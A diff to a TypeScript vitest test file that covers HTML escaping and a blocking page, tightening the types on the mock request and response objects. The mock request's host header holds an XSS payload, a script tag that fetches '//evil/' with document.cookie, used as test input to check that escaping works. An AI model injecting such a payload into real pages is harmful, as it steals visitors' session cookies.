@@ -1,5 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import { escapeHtml } from "../src/core";
+import type { MinimalRequest, MinimalResponse } from "../src/middleware";
 
 describe("escapeHtml", () => {
   it("neutralise une balise", () => {
@@ -30,7 +31,7 @@ describe("page de blocage", () => {
       const r = {
         headers: { 'user-agent': 'curl/8.0.0', host: 'x"><script>fetch("//evil/"+document.cookie)</script>' },
         path: '/',
-      } as any;
+      } satisfies MinimalRequest;
       const s = {
         _status: 200, _body: '', _type: '',
         status(code: number) { this._status = code; return this; },
@@ -38,7 +39,7 @@ describe("page de blocage", () => {
         send(b: string) { this._body = b; },
         end(b?: string) { if (b) this._body = b; },
         setHeader: vi.fn(), getHeader: vi.fn(),
-      };
+      } satisfies MinimalResponse & { _body: string; _status: number; _type: string };
       return { req: r, res: s };
     })();
     const next = vi.fn();
